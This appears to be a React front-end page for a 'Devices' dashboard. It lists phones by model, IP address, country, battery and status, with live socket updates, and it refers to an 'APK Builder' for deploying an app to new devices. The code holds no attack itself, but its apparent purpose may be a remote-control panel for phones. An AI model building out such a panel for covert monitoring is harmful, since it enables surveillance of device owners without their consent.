import React, { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import axios from "axios";
import io from "socket.io-client";
import {
  FiSmartphone,
  FiSearch,
  FiFilter,
  FiMoreVertical,
  FiWifi,
  FiGlobe,
  FiBattery,
  FiClock,
} from "react-icons/fi";

const API = import.meta.env.VITE_API_URL || "http://localhost:5000";
const WS_URL = import.meta.env.VITE_WS_URL || "http://localhost:5000";

export default function Devices() {
  const [devices, setDevices] = useState([]);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState("all");

  useEffect(() => {
    fetchDevices();

    const socket = io(WS_URL, {
      auth: { token: localStorage.getItem("token") },
    });

    socket.on("device:online", () => fetchDevices());
    socket.on("device:offline", () => fetchDevices());
    socket.on("device:data", () => fetchDevices());

    return () => socket.close();
  }, []);

  const fetchDevices = async () => {
    try {
      const token = localStorage.getItem("token");
      const res = await axios.get(`${API}/api/devices`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      setDevices(res.data);
    } catch (err) {
      console.error("Failed to fetch devices:", err);
    }
  };

  const filteredDevices = devices.filter((device) => {
    const matchesSearch =
      device.deviceModel?.toLowerCase().includes(search.toLowerCase()) ||
      device.deviceId?.toLowerCase().includes(search.toLowerCase()) ||
      device.ip?.includes(search) ||
      device.alias?.toLowerCase().includes(search.toLowerCase());

    if (filter === "online") return matchesSearch && device.status === "online";
    if (filter === "offline")
      return matchesSearch && device.status === "offline";
    return matchesSearch;
  });

  const getBatteryColor = (level) => {
    if (!level) return "text-dark-400";
    if (level > 60) return "text-green-400";
    if (level > 20) return "text-yellow-400";
    return "text-red-400";
  };

  return (
    <div className="space-y-8">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold">Devices</h1>
          <p className="text-dark-400 mt-1">{devices.length} total device(s)</p>
        </div>
        <div className="flex items-center gap-3">
          <div className="relative">
            <FiSearch className="absolute left-3 top-1/2 -translate-y-1/2 text-dark-400" />
            <input
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search devices..."
              className="pl-10 pr-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white placeholder-dark-400 focus:outline-none focus:border-primary-500/50 w-64"
            />
          </div>
          <select
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            className="px-4 py-2 rounded-xl bg-dark-700/50 border border-dark-600/50 text-white focus:outline-none focus:border-primary-500/50"
          >
            <option value="all">All Devices</option>
            <option value="online">Online</option>
            <option value="offline">Offline</option>
          </select>
        </div>
      </div>

      <div className="grid grid-cols-1 gap-4">
        {filteredDevices.length === 0 ? (
          <div className="glass-effect rounded-2xl p-12 text-center">
            <FiSmartphone className="text-5xl mx-auto mb-4 text-dark-500" />
            <p className="text-dark-400 text-lg">No devices found</p>
            <p className="text-dark-500 text-sm mt-2">
              Build and deploy an APK from the APK Builder
            </p>
          </div>
        ) : (
          filteredDevices.map((device) => (
            <Link
              key={device.deviceId}
              to={`/devices/${device.deviceId}`}
              className="glass-effect rounded-2xl p-5 card-hover flex items-center justify-between group"
            >
              <div className="flex items-center gap-5">
                <div className="relative">
                  <div
                    className={`w-3 h-3 rounded-full ${
                      device.status === "online"
                        ? "bg-green-400 shadow-lg shadow-green-400/30"
                        : "bg-dark-500"
                    }`}
                  />
                </div>
                <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary-500/20 to-purple-500/20 flex items-center justify-center">
                  <FiSmartphone className="text-primary-400 text-xl" />
                </div>
                <div>
                  <p className="font-semibold text-lg">
                    {device.alias || device.deviceModel || "Unknown Device"}
                  </p>
                  <div className="flex items-center gap-4 mt-1 text-sm text-dark-400">
                    <span>
                      {device.os} {device.osVersion}
                    </span>
                    <span>·</span>
                    <span className="flex items-center gap-1">
                      <FiGlobe className="text-xs" />
                      {device.country || "Unknown"}
                    </span>
                    {device.batteryLevel && (
                      <>
                        <span>·</span>
                        <span
                          className={`flex items-center gap-1 ${getBatteryColor(
                            device.batteryLevel
                          )}`}
                        >
                          <FiBattery className="text-xs" />
                          {device.batteryLevel}%
                        </span>
                      </>
                    )}
                  </div>
                </div>
              </div>

              <div className="flex items-center gap-6">
                <div className="text-right text-sm">
                  <p className="text-dark-400">{device.ip}</p>
                  <p className="text-dark-500 text-xs mt-0.5">
                    {device.lastSeen
                      ? new Date(device.lastSeen).toLocaleString()
                      : "Never"}
                  </p>
                </div>
                <div
                  className={`px-3 py-1.5 rounded-full text-xs font-medium ${
                    device.status === "online"
                      ? "bg-green-500/10 text-green-400 border border-green-500/20"
                      : "bg-dark-600/50 text-dark-400 border border-dark-600/30"
                  }`}
                >
                  {device.status}
                </div>
              </div>
            </Link>
          ))
        )}
      </div>
    </div>
  );
}
